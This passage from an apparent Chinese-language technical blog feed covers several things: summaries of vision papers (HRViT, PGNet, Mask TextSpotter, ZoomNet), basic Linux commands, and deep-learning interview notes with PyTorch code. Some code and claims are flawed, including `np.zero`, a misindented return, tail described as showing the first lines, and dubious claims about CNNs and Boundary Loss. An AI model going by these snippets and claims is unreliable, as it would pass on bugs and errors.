s$，在每个窗口中，将补丁分块为$K$个$d_k$维头部，然后应用局部self-attention。将零填充应用于输入$x_H$或$x_V$，以允许完整的第k个窗口，然后将注意力图中的填充区域屏蔽为0，以避免不连贯的语义关联<br>原始的QKV线性层在计算和参数方面非常昂贵，因此共享键和值张量的线性投影，以节省计算和参数，此外，引入一个辅助路径，该路径具有并行深度方向卷积，以注入归纳偏置以促进训练，与CSWin中的局部位置编码不同，我们的并行路径是非线性的，并且在没有窗口划分的情况下应用于整个4—D特征映射$W^Vx$而没有窗口分区，这条路径可以被视为一个反向残差模块，它与self-attention中的线性投影层共享逐点卷积。这种共享路径可以有效注入归纳偏差，并以边际硬件开销的情况下增强局部特征聚合，作为对上述键值共享的性能补偿，引入一个额外的Hardswish函数来改善非线性，附加一个初始化为恒等投影的BatchNorm层以稳定分布以获得更好的可训练性，此外还添加了一个通道式投影作为多样性增强快捷方式，与传统增强的快捷方式不同，此快捷方式具有更高的非线性，不依赖于对硬件不友好的傅里叶变换。</p><h3 id="混合尺度卷积前馈网络"><a href="#混合尺度卷积前馈网络" class="headerlink" title="混合尺度卷积前馈网络"></a>混合尺度卷积前馈网络</h3><div align="center"><img src="/2023/04/11/%E5%A4%9A%E5%B0%BA%E5%BA%A6%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87Transformer/MiXFCN.PNG"></div><p>受到MIT的MIxFFN和HR-NAS中多分支倒置残差块的启发，我们通过在两个线性层之间插入多个尺度深度卷积路径来设计混合尺度卷积，在MiXCFN中，在LayerForm之后，我们将信道按r的比例展开，然后将其分成两个分支，$3\times 3$和$5 \times 5$深度方向卷积用于增加HRViT的多尺度局部信息提取，出于效率的考虑，我们利用信道冗余，将MiXCFN扩展比r从4降到3或者2，</p><h3 id="下采样部分"><a href="#下采样部分" class="headerlink" title="下采样部分"></a>下采样部分</h3><p>self-attention的复杂度与图像大小成二次方，为解决大图像是的可伸缩性问题，在输入端对图像进行4倍的下采样，不在stem中使用注意操作，因为早期卷积比self-attention更能有效的提取低级特征，作为早期的卷积，遵循HRNet中的设计，并使用两个步长为2的CONV-BNReLU块作为更强的下采样stem，以提取C通道特征，并保留更多信息，这与之前使用步长为4的卷积ViTs不同.</p><p>在每个模块中的Transformer块之前，我们在分支上添加一个补丁嵌入块，用于匹配通道并通过增强的补丁之间通信提取补丁信息，但是n阶段的每个模块将会有n个嵌入块所带来的巨大算力代价，我们将补丁嵌入简化为逐点CONV，然后是深度CONV。</p><p>交叉分辨率融合，在每个模块的开头插入重复的交叉分辨率融合层。为了帮助LR特征保持更多的图像细节和精准的位置信息，我们将它们与下采样的HR特征合并，不使用基于渐进卷积的下采样路径来匹配张量形状，而是采用直接下采样路径来最小化算力开销，在第i个输入和第j个输出之间的下采样路径中，使用步长为$2j-i$的深度可分离卷积来缩小空间维度并匹配输出通道。</p><p>多尺度ViT分层架构来逐步下采样的金字塔特征。PVT将金字塔结构集成到ViT中以进行多尺度特征提取，Twins交织局部和全局注意力以学习多尺度表示，SegFormer提出了一种有效的分层编码器来提取粗略和精细的特征，CSWin通过多尺度十字形局部注意力进一步提高性能。</p><p>用于语义分割的多尺度表示学习：原有的分割框架是逐步对特征图进行下采样以计算LR表示，并通过上采样恢复HR特征，例如SegNet，UNet，Hourglass，HRNet通过跨分辨率融合在整个网络中维护HR表示，Lite-HRNet提出了条件通道加权块来跨分辨率交换信息，HR-NAS搜索反转残差块和辅助Transformer分支的通道</p>]]></content>
      
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Transformer </tag>
            
            <tag> Segmentation </tag>
            
            <tag> High-Resolution Vision </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Multi-Scale High-Resolution Vision Transformer for Semantic Segmentation</title>
      <link href="/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/"/>
      <url>/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Pyramid-Grafting-Network-for-One-Stage-High-Resolution-Saliency-Detection"><a href="#Pyramid-Grafting-Network-for-One-Stage-High-Resolution-Saliency-Detection" class="headerlink" title="Pyramid Grafting Network for One-Stage High Resolution Saliency Detection"></a><center>Pyramid Grafting Network for One-Stage High Resolution Saliency Detection</center></h1><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>由于采样深度和感受野大小之间的矛盾，大多数根据低分辨输入设计的SOD模型在高分辨率图像中表现不佳，本文提出一种金字塔嫁接网络。使用transformer和CNN主干分别从不同分辨率的图像中提取特征，然后将特征从transformer分支嫁接到CNN分支，与此同时提出一种基于注意的分叉模型嫁接模块，使CNN分支能够在解码过程中，在不同信源特征的引导下，更全面地组合破碎的细节信息，此外还设计了一个注意引导丢失来明确监督交叉嫁接模块生成注意矩阵，以帮助网络更好地与来自不同模型的注意进行交互。</p><h3 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h3><p>当前主流的SOD模型遇到高分辨率的图像，为了减少内存的开销往往会将图像先下采样然后对输出结果上采样已恢复原始分辨率，由于现在的SOD模型都是使用编码器-解码器的方式设计的，随着分辨率的大幅度提高，提取的特征大小会增加，但是网络的感受野是固定的，使得相对感受野变小，最终导致无法捕获对任务至关重要的全局语义。</p><div align="center"><img src="/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/高分辨率下的传统模型困境.PNG"></div> <p>目前对于高分辨率SOD方法有两种主流：HRSOD和DHQSOD，其中HRSOD将整个过程分为全局阶段，局部阶段和重组阶段，全局阶段为局部阶段和作物过程提供指导。DHSOD将SOD任务分解为分类任务和回归任务，这两个任务通过他们提出的trimap和不确定性损失连接起来，它们生成具有清晰边界的相对较好的显著性贴图。但是这两者都是使用多阶段架构，将SOD分为语义(低分辨率)和细节(高分辨率)两个阶段。由此引出两个问题：</p><blockquote><ul><li>阶段间语境语义迁移不一致，在前一个阶段获得的中间映射被输入到最后一个阶段，同时错误也被传递，由此后续细化阶段可能将继续放大错误</li><li>耗时，与单阶段相比，多阶段方法不仅难以并行且参数过多，模型运行运行速度较慢</li></ul></blockquote><h3 id="高分辨率SDO发展"><a href="#高分辨率SDO发展" class="headerlink" title="高分辨率SDO发展"></a>高分辨率SDO发展</h3><p>Zeng等人<a href="https://ieeexplore.ieee.org/document/9008818">Towards High-Resolution Salient Object Detection</a>提出了一种高分辨率显著目标检测范式，使用GSN提取语义信息，使用APS引导的LRN优化局部细节，最后使用GLFN进行预测融合。他们还提供了第一个高分辨率显著目标检测数据集（HRSOD）。Tang等人<a href="https://ieeexplore.ieee.org/document/9709916">Disentangled high quality salient object detection</a>提出，显著目标检测应分为两项任务。他们首先设计LRSCN以在低分辨率下捕获足够的语义并生成trimap。通过引入不确定性损失，所设计的HRRN可以对第一阶段使用低分辨率数据集生成的trimap进行细化。然而，它们都使用多级体系结构，这导致推理速度较慢，难以满足某些实际应用场景。更严重的问题是网络之间的语义不一致。</p><p>使用常用的SOD数据集通常分辨率较低，用他们来训练高分辨率网络和评估高质量分割存在以下几点缺点:</p><blockquote><ul><li>图像分辨率低导致细节不足</li><li>注释边缘的质量较差</li><li>注释的更加精细级别不够令人满意</li></ul></blockquote><p>当前可用的高分辨率数据集是HRSOD，但是HRSOD数据集图像数量有限,严重影响模型的泛化能力。</p><h3 id="Staggered-Grafting-Framework"><a href="#Staggered-Grafting-Framework" class="headerlink" title="Staggered Grafting Framework"></a>Staggered Grafting Framework</h3><p>网络框架如图所示：</p><div align="center"><img src="/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/Pyramid_Grafting_network.PNG"></div> <p>由两个编码器和一个解码器构成，使用Swim transformer和ResNet18作为编码器，transformer编码器能够在低分辨率情况下获得准确的全局语义信息，卷积编码器能够在高分辨率输入下获得丰富的细节信息，不同模型之间的提取的特征可能是互补的，可以获得更多的有效特征。</p><p>在编码的过程中，向两个编码器馈送不同分辨率的图像，并行获取全局语义信息和详细信息。解码分为三个过程，一个是Swim解码，一个是嫁接编码，最后是交错结构的ResNet解码，在第二个子阶段的解码特征是从跨模态移植模块产生的，其中全局语义信息从Swin分支移植到ResNet分支，跨模态移植模块还会处理一个名为CAM的矩阵进行监督</p><h3 id="交叉模型迁移模块-CMGM"><a href="#交叉模型迁移模块-CMGM" class="headerlink" title="交叉模型迁移模块(CMGM)"></a>交叉模型迁移模块(CMGM)</h3><p>作用：移植由两个编码器提取的特征，对于transformer所提取的特征$f_{S_2}$能够远距离捕获信息，具有全局语义信息。使用ResNet所得到的$f_{R_5}$有更好的局部信息，也就是更丰富的细节信息。但是由于特征大小和感受野之间的差异，在$f_{R_5}$中有更多的噪声。</p><p>使用常见的融合方法：如逐元素相加和相乘的适用情况限制在显著预测和不同特征生成的预测至少有一部分是对的情况下，否则就是一种错误的适用方式，且这种操作都只关注于有限的局部信息，导致没法实现自我纠错。</p><p>作者提出使用CMGM重新计算ResNet特征和Transformer特征之间的逐点关系，将全局语义信息通过transformer分支转移到ResNet分支，从而弥补常见的错误，通过计算$E&#x3D;|G-P| \in [0,1]$得到误差图</p><h3 id="CMGM纠错效果图"><a href="#CMGM纠错效果图" class="headerlink" title=" CMGM纠错效果图"></a><center> CMGM纠错效果图</center></h3><div align="center"><img src="/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/CMGM纠错.PNG"></div> <h3 id="CMGM网络结构"><a href="#CMGM网络结构" class="headerlink" title=" CMGM网络结构"></a><center> CMGM网络结构</center></h3><div align="center"><img src="/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/CMGM网络结构.PNG"></div><h3 id="实验结果"><a href="#实验结果" class="headerlink" title=" 实验结果"></a><center> 实验结果</center></h3><div align="center"><img src="/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/PGNet定量实验结果.PNG"></div><h3 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a><center>可视化</center></h3><div align="center"><img src="/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/PGNet可视化结果.PNG"></div><p>CUDA_VISIBLE_DEVICES&#x3D;2,3 python3 -m torch.distributed.launch –nproc_per_node&#x3D;2 train_distributed.py –batchsize 4 –master_port 29501 –savepath “..&#x2F;model&#x2F;PGNet_DUTS_Test&#x2F;“ –datapath “&#x2F;storage&#x2F;GWB&#x2F;Data&#x2F;DUTS-TR”\</p>]]></content>
      
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Transformer </tag>
            
            <tag> Segmentation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OCR技术(一)</title>
      <link href="/2023/04/11/OCR/"/>
      <url>/2023/04/11/OCR/</url>
      
        <content type="html"><![CDATA[<h2 id="Mask-TextSpotter"><a href="#Mask-TextSpotter" class="headerlink" title="Mask TextSpotter"></a>Mask TextSpotter</h2><p>该文受到Mask R-CNN的启发提出了一种用于场景text spotting的可端到端训练的神经网络模型：Mask TextSpotter。与以前使用端到端可训练深度神经网络完成text spotting的方法不同，Mask TextSpotter利用简单且平滑的端到端学习过程，通过语义分割获得精确的文本检测和识别。此外，它在处理不规则形状的文本实例（例如，弯曲文本）方面优于之前的方法。</p><img src="/2023/04/11/OCR/1.PNG"><p>网络架构由四部分组成，骨干网feature pyramid network (FPN)，文本候选区域生成网络region proposal network (RPN)，文本包围盒回归网络Fast R-CNN，文本实例分割与字符分割网络mask branch。</p><h4 id="训练阶段"><a href="#训练阶段" class="headerlink" title="训练阶段"></a>训练阶段</h4><p>RPN首先生成大量的文本候选区域，然后这些候选区域的RoI特征被送入Fast R-CNN branch和mask branch，由它们去分别生成精确的文本候选包围盒（text candidate boxes）、文本实例分割图（text instance segmentation maps）、字符分割图（character segmentation maps）。它将输入的RoI（固定大小$16\times64$）经过4层卷积层和1层反卷积层，生成38通道的图（大小$32\times128$），包括一个全局文本实例图——它给出了文本区域的精确定位，无论文本排列的形状如何它都能分割出来，还包括36个字符图（对应于字符0～9，A～Z），一个字符背景图（排除字符后的的所有背景区域），在后处理阶段字符背景图会被用到。</p><p>推理阶段mask branch的输入RoIs来自于Fast R-CNN的输出。<br>推理的过程如下：首先输入一幅测试图像，通过Fast R-CNN获取候选文本区域，然后通过NMS（非极大抑制）过滤掉冗余的候选区域，剩下的候选区域resize后送入mask branch，得到全局文本实例图，和字符图。通过计算全局文本实例图的轮廓可以直接得到包围文本的多边形，通过在字符图上使用提出的pixel voting方法生成字符序列。<br>如上图所示，Pixel voting方法根据字符背景图中每一个联通区域，计算每一字符层相应区域的平均字符概率，即得到了识别的结果。<br>为了在识别出来的字符序列中找到最佳匹配单词，作者在编辑距离（Edit Distance）基础上发明了加权编辑距离（Weighted Edit Distance）</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> OCR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zoom In and Out:A Mixed-scale Triplet Network for Camouflaged Object Detection</title>
      <link href="/2023/04/11/Zoom/"/>
      <url>/2023/04/11/Zoom/</url>
      
        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>最近提出的伪装目标检测（COD）试图分割视觉上融入周围环境的目标，这在现实场景中是极其复杂和困难的。除了伪装对象与其背景之间具有很高的内在相似性外，这些对象通常在尺度上具有多样性，外观模糊，甚至被严重遮挡。为了解决这些问题，我们提出了一种混合比例的三重网络ZoomNet，它模仿人类在观察模糊图像时的行为，即放大和缩小。具体而言，我们的ZoomNet采用缩放策略，通过设计的尺度积分单元和分层混合尺度单元学习区分性混合尺度语义，充分挖掘候选对象和背景环境之间的细微线索。此外，考虑到来自不可区分纹理的不确定性和模糊性，我们构造了一个简单而有效的正则化约束，即不确定性感知损失，以促进模型在候选区域准确地生成具有更高置信度的预测。我们提出的高度任务友好的模型在四个公共数据集上始终优于现有的23种最先进的方法。此外，与最新的前沿模型相比，该模型在SOD任务上的优异性能也验证了该模型的有效性和通用性。</p><h2 id="COD任务难点"><a href="#COD任务难点" class="headerlink" title="COD任务难点"></a>COD任务难点</h2><blockquote><ul><li>如何在外观不明显和各种尺度的情况下准确定位伪装对象</li><li>如何抑制来自背景的明显干扰，更可靠地推断伪装对象</li></ul></blockquote><p>为了准确地找到场景中模糊或伪装的对象，人类可以尝试通过放大和缩小图像来参考和比较不同尺度下形状和外观的变化，这种行为模式为本文提供思路，可以通过模拟人类放大和缩小策略来识别伪装的物体。本文中提出一种混合规模的三重网络$ZoomNet$。为了精准定位目标，我们使用尺度空间理论来模拟放大和缩小策略，为此设计了两个关键模块</p><blockquote><ul><li>规模集成单元(SIU):筛选和聚合特定尺度的特征</li><li>分层混合规模单元(HMU):重组和增强混合尺度特征</li></ul></blockquote><p>此结构能够在混合尺度下挖掘出物体和背景之间准确而微妙的语义线索，并产生准确的预测，为了实现效率和有效性的平衡，模型采用共享权重策略，为增强模型在复杂场景下的泛化能力，设计了一个不确定性感知损失(UAL)来指导模型训练，模型结构图：</p><div align="center"><img src="/2023/04/11/Zoom/ZoomNet可视化.PNG"></div><h2 id="网络结构图"><a href="#网络结构图" class="headerlink" title="网络结构图"></a>网络结构图</h2><div align="center"><img src="/2023/04/11/Zoom/ZoomNet.png"></div><p>SIU：使用一个尺度作为主尺度，另外两个尺度作为辅助，利用共享的三元组特征编码器来提取不同尺度的特征并将它们馈送到尺度合并层。对于高尺度，使用最大池化加平均池化的混合结构进行下采样，这有助于在高分辨率特征中保持伪装对象的有效和多样性响应。对于低尺度使用双线性插值直接向上采样，然后将这些特征输入注意力生成器，并通过一系列卷积层计算出三通道特征图。然后再softmax激活层之后，可以获得对应于每个尺度的注意力映射计算权重为：</p><div align="center"><img src="/2023/04/11/Zoom/SIU.png"></div><div align="center">$\Large A_i=softmax(\Psi[U(f^{0.5}_i,f^{1.0}_i,D(f^{1.5}_i)],\phi)$</div><br><div align="center">$\Large f_i=A^{0.5}_i\cdot U(f^{0.5}_i)+A^{1.0}_i\cdot f^{1.0}_i+A^{1.5}_i\cdot D(f^{1.5}_i)$</div>]]></content>
      
      
      <categories>
          
          <category> COD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> COD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liunx常用命令</title>
      <link href="/2022/10/07/Liunx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/10/07/Liunx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>pwd：显示当前工作目录的绝对路径</p><pre><code>ls:（1）-a：显示当前目录的所有文件和目录包括隐藏的   （2）-l：一列表的方式显示信息</code></pre><p>mkdir：用于创建目录，默认是单级目录，创建多级目录加一个 -p即可</p><p>rmdir:删除空目录，如果目录下面有内容时不可以删除，如果要强行删除有内容的文件夹使用 rm -rf删除</p><p>touch指令：创建空文件</p><p>cp：拷贝指令，拷贝文件到指定目录。基本语法：cp [选项] source dest 其中-r代表可以使用递归复制的方式拷贝整个文件夹</p><p>mv:移动文件与目录或者重命名</p><pre><code>基本语法：（1）mv oldNameFile newNameFile （重命名）         （2）mv /temp/movefile /targetFolder (移动文件)</code></pre><p>cat：查看文件指令， cat [选项] 要查看的文件 -n ：显示行号</p><p>less:用来分屏查看文件内容</p><p>echo：输出内容到控制台 用法：echo [选项] [输出内容]</p><p>head：用于显示文件的开头部分内容，默认情况下是显示文件的前10行内容</p><p>tail：用于显示文件中尾部的内容，默认情况下tail指令显示文件的前10行内容。语法</p><pre><code>（1）tail文件：查看文件尾部10行内容（2）tail -n 5 文件 查看文件尾5行内容，数字可以随便（3）tail -f 文件 实时追踪该文档的所有更新</code></pre><p> $&gt;$ 指令和$&gt;&gt;$指令：输出重定向和追加</p><pre><code>基本语法：（1）ls -l &gt; 文件 （将列表的内容写入文件中覆盖的方式）        （2）ls -al &gt;&gt;文件  （将列表的内容追加写入到文件中）        （3）cat 文件1 &gt; 文件2 （将文件1的内容覆盖到文件2）</code></pre><p>ln：软连接也称为符号链接，类似于windows中的快捷方式，主要存放了链接其他文件的路径</p><pre><code>基本语法： ln -s [原文件或目录] [软链接名] （给原文件创建一个软链接）</code></pre><p>history：查看已经执行过的历史指令，也可以执行历史指令</p>]]></content>
      
      
      <categories>
          
          <category> Liunx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Liunx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习面试(一)</title>
      <link href="/2022/04/07/day_one/"/>
      <url>/2022/04/07/day_one/</url>
      
        <content type="html"><![CDATA[<p>U-Net的业务场景：<br>    U-Net是一种深度学习神经网络结构，主要用于图像分割任务，特别是医学图像分割。相比于普通的CNN，U-Net具有以下特点：<br>    1. U-Net是一种全卷积网络结构，可以对任意大小的图像进行分割，而不需要调整输入图像大小。<br>    2. U-Net采用类似编码器-解码器的结构，通过对输入图像进行多次下采样和上采样，能够提取图像的多层次特征信息。<br>    3. U-Net的解码器部分采用反卷积操作，能够对特征图进行上采样恢复，从而实现尺寸输出等同于原图的效果。<br>    4. U-Net在标注数据有限的情况下，能够获取到更高质量的分割结果，有一定的鲁棒性。<br>U-Net的使用场景，主要是医学图像分割任务，例如血管分割、肺部分割、细胞分割等领域。同时，U-Net也可以用于其他类型的图像分割任务。</p><p>U-Net相较于CNN的特点<br>UNET是一种基于卷积神经网络(CNN)的语义分割模型，具有以下特点：<br>    1. 全卷积结构：UNET采用全卷积结构，使得模型可以接受任意大小的输入图像，而输出相同大小的分割结果。<br>    2. 对称结构：UNET具有对称的编码器-解码器结构，编码器对输入图像进行多层次的特征提取，解码器则将特征图恢复到与输入相同分辨率的输出分割图。<br>    3. 上采样和跳跃连接：UNET使用上采样操作将编码器中的低分辨率特征图恢复到高分辨率，同时使用跳跃连接将编码器中的特征图与解码器中的特征图进行连接，增加了分割结果的精度。<br>    4. 数据增强：UNET采用数据增强技术，通过旋转、缩放、翻转等操作扩充训练数据集，提高模型泛化性能。<br>相比之下，CNN通常用于图像分类任务，它的特点包括：<br>    1. 单一的输出：CNN输出一个标量或向量，表示图像的类别或相关属性。<br>    2. 全连接结构：CNN包含全连接层来将图像特征映射到标签空间。<br>    3. 低级特征提取：CNN通常使用较少的卷积层提取低级特征，因此对于复杂任务需要多个CNN串联才能实现。<br>    4. 精度和速度折衷：CNN是为实时预测设计的，因此在精度和速度之间做出了折衷。</p><p>coding：写一个shuffle函数打乱一维数组：遍历一遍并每个元素与随机元素互换</p><pre><code class="py">import randomdef shuffle(arr):    for i in range(len(arr)):        rand_idx = random.randint(i,len(arr)-1)        arr[i], arr[rand_idx] = arr[rand_idx], arr[i]return arr对h×w的二维灰度图进行均值滤波，模板矩阵k×k：双重循环遍历二维数组，其中嵌套双重循环加和k×k个元素求均值```pyimport numpy as np&#39;&#39;&#39;函数的输入参数为原图像img和模板大小k，返回值为均值滤波后的图像。首先定义了模板中心距离边界的偏移量h_k和w_k。然后定义函数返回值result，并初始化为一个和原图像大小相同的全0矩阵。接下来，通过双重循环遍历原图像的每个像素点(i, j)，并将模板覆盖在当前像素点(i, j)上。对于模板中的每一个元素(m, n)，需要考虑其是否越界。这里用了max和min函数来确保不超出原图像的边界。对于在原图像范围内的模板元素，将其像素值累加到sum变量中，并将计数器count加1。最后，用sum除以count来求这k×k个元素的均值，并将结果赋值给result矩阵中对应的像素值。循环结束后，函数返回result作为均值滤波后的图像。&#39;&#39;&#39;def mean_filter(img, k):    h, w = img.shape    h_k, w_k = k//2, k//2    result = np.zero((h, w), dtype=np.uint8)    for i in range(h):        for j in range(w):            sum = 0            count = 0            for m in range(max(i-h_k, 0), min(i+h_k+1, h)):                for n in range(max(j-w_k, 0), min(j+w_k+1, w)):                    sum += img[m, n]                    count += 1            result[i, j] = sum // count    return result</code></pre><h3 id="DenseUNet和ResNet"><a href="#DenseUNet和ResNet" class="headerlink" title="DenseUNet和ResNet"></a>DenseUNet和ResNet</h3><p>DenseUNet和ResUNet是两种用于语义分割的卷积神经网络模型。<br>DenseUNet模型基于DenseNet的思想，将迭代连接（skip connections）应用到了UNet模型中，提高了模型的学习能力和特征表达能力。该模型还针对边缘区域的分割效果差的问题，采用了VGG-16 的结构对边缘区域进行优化。</p><p>DenseUNet的设计思想主要是将经典的UNet网络与稠密连接（Dense Connection）的概念相结合，以提高图像分割的性能。稠密连接是指将前一层输出与当前层输入连接在一起，使得当前层可以接收到前一层的所有信息，从而增强了特征的复用性，加快了特征传递速度，提高了模型的训练效率。<br>具体来说，DenseUNet将UNet的编码器和解码器部分中的每个卷积块都改成稠密连接块。在编码器部分，每个稠密连接块由一个3×3 卷积层和一个下采样层组成，并且每个输入都连接到当前层上。在解码器部分，每个稠密连接块由一个上采样层、一个3×3 卷积层、一个跳跃连接连接和一个此前的编码器部分的相应层输出连接组成。<br>除此之外，DenseUNet还采用了多尺度的输入和输出模块来处理不同尺度的图像，以及引入了残差连接来消除梯度消失、加快收敛速度。这些设计思想使得DenseUNet在与其他图像分割方法进行比较时，具有更好的分割精度和更快的计算速度。</p><p>ResUNet模型基于ResNet和UNet的思想，使用残差连接和迭代连接实现了端到端地语义分割。该模型在高分辨率图像处理任务中表现优秀，同时还加入了空洞卷积（dilated convolution）和批归一化（batch normalization）等技术，进一步提高了模型的性能<br>总的来说，DenseUNet和ResUNet都是比较优秀的语义分割模型，但具体应该选择哪一个模型还需要根据任务的具体需求进行选择。</p><h3 id="boundary-loss"><a href="#boundary-loss" class="headerlink" title="boundary_loss"></a>boundary_loss</h3><pre><code class="py">import torchdef boundary_loss(pred, mask):    &#39;&#39;&#39;    pred: 模型预测结果, (batch_size, channels, height, width)    mask: 分割图, (batch_size, channels, height, width)    return:    boundary_loss: 边界损失    &#39;&#39;&#39;    # 计算梯度，得到边缘位置    pred_grad_x = torch.abs(pred[:, :, :, :-1] - pred[:, :, :, 1:])    pred_grad_y = torch.abs(pred[:, :, :-1, :] - pred[:, :, 1:, :])    mask_grad_x = torch.abs(mask[:, :, :, :-1] - mask[:, :, :, 1:])    mask_grad_y = torch.abs(mask[:, :, :-1, :] - mask[:, :, 1:, :])    # 计算boundary loss    loss_x = pred_grad_x * mask_grad_x    loss_y = pred_grad_y * mask_grad_y    # 对loss进行求和和平均    boundary_loss = (torch.sum(loss_x) / torch.sum(mask_grad_x) +                     torch.sum(loss_y) / torch.sum(mask_grad_y)) / 2    return boundary_loss</code></pre><p>Boundary Loss是一种针对目标检测任务的损失函数，用于优化物体边缘的预测。我们可以使用PyTorch实现Boundary Loss。</p><p>首先，我们需要导入需要的PyTorch库。</p><pre><code class="python">import torchimport torch.nn as nn</code></pre><p>接下来，我们可以定义Boundary Loss的实现。</p><pre><code class="python">class BoundaryLoss(nn.Module):    def __init__(self, alpha=1.0, beta=1.0, reduction=&#39;mean&#39;):        super(BoundaryLoss, self).__init__()        self.alpha = alpha        self.beta = beta        self.reduction = reduction    def forward(self, pred, mask):        &quot;&quot;&quot;        :param pred: (B, C, H, W) - 模型的预测边缘图        :param mask: (B, C, H, W) - 真实边缘图        :return: boundary_loss - 边缘损失        &quot;&quot;&quot;        # 计算边缘区域        dilated_mask = torch.clamp(            nn.functional.max_pool2d(mask, (3, 3), stride=1, padding=1) - mask, 0, 1)        boundary_mask = mask - dilated_mask        # 将边缘区域应用于预测边缘图        boundary_pred = pred * boundary_mask        # 计算损失        pos_loss = boundary_mask * torch.log(pred + 1e-8)        neg_loss = (1 - boundary_mask) * torch.log(1 - boundary_pred + 1e-8)        boundary_loss = -self.alpha * pos_loss - self.beta * neg_loss        # 返回损失        if self.reduction == &#39;mean&#39;:            return torch.mean(boundary_loss)        elif self.reduction == &#39;sum&#39;:            return torch.sum(boundary_loss)        else:            return boundary_loss</code></pre><p>在实现中，首先我们计算真实边缘图的边缘区域，然后将边缘区域应用于模型的预测边缘图。接着，我们计算正样本和负样本的损失，最终求和得到边缘损失。最后，我们根据设定的reduction参数，选择使用平均值或总和作为最终的损失。（注意，在计算log时，加上一个很小的值1e-8，避免出现log(0)的情况）</p><p>接下来，我们将Boundary Loss应用于目标检测任务中。</p><pre><code class="python"># 定义模型class MyDetectionModel(nn.Module):    def __init__(self):        super(MyDetectionModel, self).__init__()        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)        self.bn1 = nn.BatchNorm2d(16)        self.relu1 = nn.ReLU()        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)        self.bn2 = nn.BatchNorm2d(32)        self.relu2 = nn.ReLU()        self.conv3 = nn.Conv2d(in_channels=32, out_channels=1, kernel_size=1)        self.sigmoid = nn.Sigmoid()    def forward(self, x):        x = self.conv1(x)        x = self.bn1(x)        x = self.relu1(x)        x = self.conv2(x)        x = self.bn2(x)        x = self.relu2(x)        x = self.conv3(x)        x = self.sigmoid(x)        return x# 定义超参lr = 0.001epochs = 10alpha, beta = 1.0, 1.0reduction = &#39;mean&#39;# 定义数据加载器train_loader = torch.utils.data.DataLoader(train_dataset, batch_size=16, shuffle=True)# 定义模型和优化器model = MyDetectionModel().to(device)optimizer = torch.optim.Adam(model.parameters(), lr=lr)# 定义损失函数criterion = BoundaryLoss(alpha=alpha, beta=beta, reduction=reduction)# 训练模型for epoch in range(epochs):    for i, (images, targets) in enumerate(train_loader):        images = images.to(device)        targets = targets.to(device)        optimizer.zero_grad()                outputs = model(images)        loss = criterion(outputs, targets)        loss.backward()        optimizer.step()</code></pre><p>在训练环节中，我们加载数据，定义模型和优化器，并使用Boundary Loss作为损失函数进行优化。由于Boundary Loss针对物体边缘的优化，因此特别适合目标检测任务。</p><p>Boundary Loss是一种用于图像分割任务的损失函数，其核心思想是度量预测的边缘和真实边缘之间的距离，从而帮助网络更好地学习边缘信息。以下是在PyTorch中实现Boundary Loss的代码：</p><pre><code 